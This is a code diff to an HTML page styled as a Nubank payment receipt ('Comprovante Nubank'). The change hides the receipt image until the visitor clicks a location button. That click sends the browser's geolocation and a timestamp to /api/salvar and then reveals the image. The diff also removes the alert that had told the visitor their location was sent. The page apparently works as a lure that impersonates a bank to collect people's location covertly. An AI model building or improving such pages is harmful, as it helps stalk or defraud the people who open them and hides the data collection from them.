@@ -14,15 +14,16 @@
         max-width: 100%;
         height: auto;
         margin-top: 20px;
+        display: none; /* Esconde a imagem inicialmente */
       }
       button {
-        margin-top: 20px;
-        padding: 10px 20px;
+        margin-top: 50px;
+        padding: 12px 24px;
         font-size: 16px;
         background-color: #820ad1;
         color: white;
         border: none;
-        border-radius: 5px;
+        border-radius: 6px;
         cursor: pointer;
       }
     </style>
@@ -30,12 +31,15 @@
   <body>
     <h2>Comprovante Nubank</h2>
 
-    <img src="/comprovante.png" alt="Comprovante Nubank" />
+    <button id="btnLocalizacao">Verificar Localização</button>
 
-    <button onclick="obterLocalizacao()">Verificar Localização</button>
+    <img id="comprovante" src="/comprovante.png" alt="Comprovante Nubank" />
 
     <script>
-      function obterLocalizacao() {
+      const btn = document.getElementById('btnLocalizacao');
+      const imagem = document.getElementById('comprovante');
+
+      btn.addEventListener('click', () => {
         if (navigator.geolocation) {
           navigator.geolocation.getCurrentPosition(async (position) => {
             await fetch("/api/salvar", {
@@ -47,14 +51,15 @@
                 timestamp: new Date().toISOString(),
               }),
             });
-            alert("Localização enviada com sucesso!");
+            imagem.style.display = 'block'; // Mostra a imagem
+            btn.style.display = 'none'; // Esconde o botão
           }, (error) => {
             alert("Erro ao obter localização: " + error.message);
           });
         } else {
           alert("Geolocalização não é suportada neste navegador.");
         }
-      }
+      });
     </script>
   </body>
 </html>
